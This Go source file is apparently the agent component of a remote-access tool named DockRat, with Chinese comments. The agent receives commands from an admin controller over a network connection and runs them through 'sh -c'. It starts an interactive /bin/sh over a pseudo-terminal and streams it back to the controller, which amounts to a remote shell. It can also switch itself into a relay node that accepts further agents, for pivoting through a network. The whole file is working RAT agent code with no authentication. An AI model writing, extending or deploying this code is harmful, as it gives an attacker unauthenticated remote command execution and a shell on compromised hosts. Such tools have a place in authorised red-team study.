package network

import (
	"encoding/json"
	"io"
	"log"
	"net"
	"os/exec"
	"strings"

	"github.com/Singert/DockRat/core/common"
	"github.com/Singert/DockRat/core/node"
	"github.com/Singert/DockRat/core/protocol"
	"github.com/creack/pty"
)

var shellStarted = false
var shellStdin io.WriteCloser

// ✅ 统一入口：默认 agent 启动模式
func StartBasicAgent(conn net.Conn) {
	for {
		msg, err := readMessageFromConn(conn)
		if err != nil {
			log.Printf("[-] Agent connection closed: %v", err)
			return
		}

		switch msg.Type {
		case protocol.MsgCommand:
			handleCommand(msg, conn)
		case protocol.MsgShell:
			handleShellPTY(msg, conn)
		case protocol.MsgStartRelay:
			// 🔁 动态转为 relay 模式
			handleStartRelay(msg, conn)
			return // 停止 BasicAgent 循环，由 relay 接管连接
		default:
			log.Printf("[-] Unknown or unsupported message: %s", msg.Type)
		}
	}
}

// ✅ relay agent 的消息处理逻辑
func StartRelayAgent(conn net.Conn, ctx *RelayContext) {
	for {
		msg, err := readMessageFromConn(conn)
		if err != nil {
			log.Printf("[-] RelayAgent connection error: %v", err)
			return
		}
		switch msg.Type {
		case protocol.MsgCommand:
			handleCommand(msg, conn)
		case protocol.MsgShell:
			handleShellPTY(msg, conn)
		case protocol.MsgRelayPacket:
			var pkt protocol.RelayPacket
			if err := json.Unmarshal(msg.Payload, &pkt); err != nil {
				log.Println("[-] Decode relay_packet failed:", err)
				continue
			}
			HandleRelayPacket(ctx, pkt)
		case protocol.MsgRelayAck:
			var ack protocol.RelayAckPayload
			_ = json.Unmarshal(msg.Payload, &ack)
			log.Printf("[+] Relay register success: %s", ack.Message)
		case protocol.MsgRelayError:
			var errMsg protocol.RelayAckPayload
			_ = json.Unmarshal(msg.Payload, &errMsg)
			log.Printf("[!] Relay register failed: %s", errMsg.Message)
		default:
			log.Printf("[-] RelayAgent unknown message type: %s", msg.Type)
		}
	}
}

// ✅ 处理 admin 发来的 startrelay 请求，动态切换为 relay 节点
func handleStartRelay(msg protocol.Message, conn net.Conn) {
	var payload protocol.StartRelayPayload
	if err := json.Unmarshal(msg.Payload, &payload); err != nil {
		log.Println("[-] StartRelay payload decode error:", err)
		return
	}

	log.Printf("[*] Received startrelay: listen on %s, ID range [%d ~ %d]",
		payload.ListenAddr, payload.IDStart, payload.IDStart+payload.Count-1)

	ctx := &RelayContext{
		SelfID:      payload.SelfID,
		Registry:    node.NewRegistry(),
		Topology:    node.NewNodeGraph(),
		IDAllocator: common.NewIDAllocator(payload.IDStart, payload.Count),
		Upstream:    conn,
	}

	go StartRelayListener(payload.ListenAddr, ctx)

	ack := protocol.RelayReadyPayload{
		SelfID:     ctx.SelfID,
		ListenAddr: payload.ListenAddr,
	}
	data, _ := json.Marshal(ack)
	resp := protocol.Message{Type: protocol.MsgRelayReady, Payload: data}
	buf, _ := protocol.EncodeMessage(resp)
	conn.Write(buf)
	StartRelayAgent(conn, ctx)
}

// ✅ 读取一个消息帧
func readMessageFromConn(conn net.Conn) (protocol.Message, error) {
	lengthBuf := make([]byte, 4)
	if _, err := io.ReadFull(conn, lengthBuf); err != nil {
		return protocol.Message{}, err
	}
	length := bytesToUint32(lengthBuf)
	data := make([]byte, length)
	if _, err := io.ReadFull(conn, data); err != nil {
		return protocol.Message{}, err
	}
	return protocol.DecodeMessage(data)
}

// ✅ 命令执行处理
func handleCommand(msg protocol.Message, conn net.Conn) {
	var payload map[string]string
	if err := json.Unmarshal(msg.Payload, &payload); err != nil {
		log.Println("[-] Command unmarshal error:", err)
		return
	}
	cmdStr := payload["cmd"]
	log.Println("[+] Received command:", cmdStr)

	output, err := exec.Command("sh", "-c", cmdStr).CombinedOutput()
	if err != nil {
		output = append(output, []byte("\n[!] Command error: "+err.Error())...)
	}

	resp := protocol.Message{Type: protocol.MsgResponse, Payload: output}
	data, _ := protocol.EncodeMessage(resp)
	conn.Write(data)
}

// ✅ shell 模式处理（支持远程交互）
func handleShellPTY(msg protocol.Message, conn net.Conn) {
	line := string(msg.Payload)

	if !shellStarted {
		cmd := exec.Command("/bin/sh")
		ptmx, err := pty.Start(cmd)
		if err != nil {
			log.Println("[-] Failed to start pty:", err)
			return
		}
		shellStarted = true
		shellStdin = ptmx

		go func() {
			buf := make([]byte, 1024)
			for {
				n, err := ptmx.Read(buf)
				if err != nil {
					log.Println("[-] Shell read error:", err)
					return
				}
				msg := protocol.Message{
					Type:    protocol.MsgShell,
					Payload: buf[:n],
				}
				data, _ := protocol.EncodeMessage(msg)
				conn.Write(data)
			}
		}()
		return
	}

	if !strings.HasSuffix(line, "\n") {
		line += "\n"
	}
	_, err := shellStdin.Write([]byte(line))
	if err != nil {
		log.Println("[-] Write to shell error:", err)
	}
}
